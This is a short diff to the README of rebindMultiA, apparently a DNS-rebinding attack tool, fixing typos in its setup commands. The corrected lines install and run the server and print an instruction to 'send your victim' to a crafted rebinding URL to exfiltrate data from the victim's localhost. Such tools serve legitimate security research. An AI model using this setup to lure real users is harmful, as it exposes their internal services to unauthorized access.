@@ -63,7 +63,7 @@ This must be executed from publically accessible IP.
 ```
 git clone https://github.com/Rhynorater/rebindMultiA
 cd rebindMutliA
-pip3 install -r requirements
-echo "Send your victim to http://127.0.0.1.target.`curl -s http:/ipinfo.io/ip`.ns.rebindmultia.com/parent to exfil 127.0.0.1
-sudo python3 server
+pip3 install -r requirements.txt
+echo "Send your victim to http://127.0.0.1.target.`curl -s http://ipinfo.io/ip`.ns.rebindmultia.com/parent to exfil 127.0.0.1"
+sudo python3 server.py
 ```
